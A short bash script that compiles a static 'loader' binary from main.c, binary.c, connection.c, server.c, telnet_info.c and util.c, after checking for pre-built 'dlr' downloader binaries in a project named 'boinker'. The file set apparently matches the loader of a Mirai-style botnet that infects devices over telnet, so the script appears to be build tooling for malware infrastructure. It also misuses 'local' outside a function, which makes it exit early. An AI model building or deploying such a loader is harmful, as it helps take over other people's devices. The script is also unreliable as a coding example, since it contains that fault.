#!/bin/bash

# Loader Build Script
# Compiles the loader for the current architecture

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
LOADER_SOURCE_DIR="/root/boinker/loader/src"
OUTPUT_DIR="/root/boinker/loader"
BINARY_DIR="/root/boinker/loader/bins"

echo -e "${BLUE}=== Loader Build Script ===${NC}"
echo -e "${YELLOW}Source Directory: $LOADER_SOURCE_DIR${NC}"
echo -e "${YELLOW}Output Directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Binary Directory: $BINARY_DIR${NC}"

# Create output directory
mkdir -p "$OUTPUT_DIR"
mkdir -p "$BINARY_DIR"

# Check if DLR binaries exist
if [ ! -d "$BINARY_DIR" ] || [ -z "$(ls -A "$BINARY_DIR"/dlr.* 2>/dev/null)" ]; then
    echo -e "${RED}ERROR: No DLR binaries found in $BINARY_DIR${NC}"
    echo -e "${YELLOW}Please run build_dlr.sh first to generate DLR binaries${NC}"
    exit 1
fi

echo -e "${GREEN}Found DLR binaries:${NC}"
ls -la "$BINARY_DIR"/dlr.* 2>/dev/null

echo -e "${BLUE}Compiling loader...${NC}"

cd "$LOADER_SOURCE_DIR"

# Compile the loader
if ! gcc -o "$OUTPUT_DIR/loader" \
    -std=c99 \
    -D_GNU_SOURCE \
    -O2 \
    -Wall \
    -Wextra \
    -Werror \
    -static \
    main.c \
    binary.c \
    connection.c \
    server.c \
    telnet_info.c \
    util.c \
    -lpthread; then
    echo -e "${RED}Compilation failed${NC}"
    exit 1
fi

# Get binary size
local size=$(stat -c%s "$OUTPUT_DIR/loader" 2>/dev/null || echo "unknown")
echo -e "${GREEN}Successfully compiled loader (${size} bytes)${NC}"

# Make executable
chmod +x "$OUTPUT_DIR/loader"

echo -e "${BLUE}=== Build Summary ===${NC}"
echo -e "${YELLOW}Loader binary: $OUTPUT_DIR/loader${NC}"
echo -e "${YELLOW}DLR binaries directory: $BINARY_DIR${NC}"

echo -e "${GREEN}Loader build completed!${NC}"
echo -e "${YELLOW}Usage: $OUTPUT_DIR/loader [id_tag]${NC}"
